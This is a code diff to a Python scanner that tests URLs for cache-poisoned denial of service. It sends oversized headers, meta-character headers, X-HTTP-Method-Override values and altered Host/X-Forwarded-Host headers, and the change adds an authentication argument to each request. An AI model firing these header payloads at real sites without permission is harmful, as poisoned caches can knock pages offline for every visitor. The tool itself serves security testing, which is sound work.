@@ -4,7 +4,7 @@
 import requests
 import traceback
 
-def HHO(url, s, main_status_code):
+def HHO(url, s, main_status_code, authent):
     #HTTP Header Oversize 
 
     cpdos_win = False
@@ -13,7 +13,7 @@ def HHO(url, s, main_status_code):
     while i < max_i:
         h = {"X-Oversized-Header-{}".format(i):"Big-Value-00000000000000000000000000000000000000000000000000000000000000000000"}
         try:
-            req_hho = s.get(url, headers=h)
+            req_hho = s.get(url, headers=h, auth=authent)
             if req_hho.status_code in [400, 413, 500] and req_hho.status_code != main_status_code:
                 print(h)
                 print(url)
@@ -31,35 +31,35 @@ def HHO(url, s, main_status_code):
         print("   └── \033[31m{} CPDos HHO seem work !\033[0m".format(url))
 
 
-def HMC(url, s, main_status_code):
+def HMC(url, s, main_status_code, authent):
     chars = [r"\n", r"\a", r"\r"]
     for c in chars:
         headers = {"X-Metachar-Header": c}
-        req_hmc = s.get(url, headers=headers, timeout=10, verify=False)
+        req_hmc = s.get(url, headers=headers, timeout=10, verify=False, auth=authent)
         if req_hmc.status_code in [400, 413, 500]:
-            req_verify_hmc = s.get(url, verify=False, timeout=10)
+            req_verify_hmc = s.get(url, verify=False, timeout=10, auth=authent)
             if req_verify_hmc.status_code == req_hmc.status_code:
                 print("   └── \033[31m CPDos HMC on {} seem work with {} payload header ! \033[0m".format(url, headers))
 
 
 
-def HMO(url, s, main_status_code):
+def HMO(url, s, main_status_code, authent):
     methods = ["POST", "PUT", "HELP", "DELETE"]
     for m in methods:
         headers = {"X-HTTP-Method-Override": m}
-        req_hmo = s.get(url, headers=headers, verify=False, timeout=10)
+        req_hmo = s.get(url, headers=headers, verify=False, timeout=10, auth=authent)
         if req_hmo.status_code in [404, 405] and req_hmo.status_code != main_status_code:
-            req_verify_hmo = s.get(url, verify=False, timeout=10)
+            req_verify_hmo = s.get(url, verify=False, timeout=10, auth=authent)
             if req_verify_hmo.status_code == req_hmo.status_code:
                 print("   └── \033[31m CPDos HMO on {} seem work with {} payload header ! \033[0m".format(url, headers))
 
 
-def RefDos(url, s):
+def RefDos(url, s, authent):
     headers = {
     "Referer": "xy",
     "Referer": "x"
     }
-    req_ref = s.get(url, headers=headers, verify=False, timeout=10)
+    req_ref = s.get(url, headers=headers, verify=False, timeout=10, auth=authent)
     if req_ref.status_code == 400:
         print("   └── \033[31m{}  with header {} response 400\033[0m".format(url, headers))
         for rf in req_ref.headers:
@@ -69,7 +69,7 @@ def RefDos(url, s):
 
 
 
-def check_CPDoS(url, s, req_main, domain, custom_header):
+def check_CPDoS(url, s, req_main, domain, custom_header, authent):
     i = 0
     redirect_req = False
 
@@ -80,7 +80,7 @@ def check_CPDoS(url, s, req_main, domain, custom_header):
     url = "{}?CPDoS=1".format(url)
 
     try:
-        req_main = requests.get(url, verify=False, allow_redirects=False, timeout=10)
+        req_main = requests.get(url, verify=False, allow_redirects=False, timeout=10, auth=authent)
     except:
         pass
     main_status_code = req_main.status_code
@@ -89,7 +89,7 @@ def check_CPDoS(url, s, req_main, domain, custom_header):
     headers = [{"Host": "{}:1234".format(domain)}, {"X-Forwarded-Port":"123"}, {"X-Forwarded-Host": "XXX"}, {"X-Forwarded-Host": "{}:1234".format(domain)}]
     for h in headers:
         try:
-            req_cpdos = s.get(url, headers=h, verify=False, allow_redirects=False, timeout=10)
+            req_cpdos = s.get(url, headers=h, verify=False, allow_redirects=False, timeout=10, auth=authent)
             if req_cpdos.status_code in [301, 302, 303, 421, 502, 522]:
                 print(" \033[36m├\033[0m {} + [\033[33m{}\033[0m] → \033[33m{}\033[0m".format(url, h, req_cpdos.status_code))
                 #print(" └── CPDos exploit seem to be possible, next test...")
@@ -120,7 +120,7 @@ def check_CPDoS(url, s, req_main, domain, custom_header):
                         print("   └── Not seem timeout, you can check manually if the exploit is possible")
                 else:
                     try:
-                        req_cpdos_other_verification = s.get(url, verify=False, allow_redirects=False, timeout=10)
+                        req_cpdos_other_verification = s.get(url, verify=False, allow_redirects=False, timeout=10, auth=authent)
                         if req_cpdos_other_verification.status_code != req_main.status_code:
                             print("   └── Not seem timeout but the page return {} status code with these informations:\n   -URL:{}\n   -HEADER{}, check it manually on {} if this page is down".format(req_cpdos_other_verification.status_code, url, h, url))
                     except:
@@ -134,7 +134,7 @@ def check_CPDoS(url, s, req_main, domain, custom_header):
             return True
         except:
             pass
-    HHO(url, s, main_status_code)
-    HMC(url, s, main_status_code)
-    HMO(url, s, main_status_code)
-    RefDos(url, s)
+    HHO(url, s, main_status_code, authent)
+    HMC(url, s, main_status_code, authent)
+    HMO(url, s, main_status_code, authent)
+    RefDos(url, s, authent)
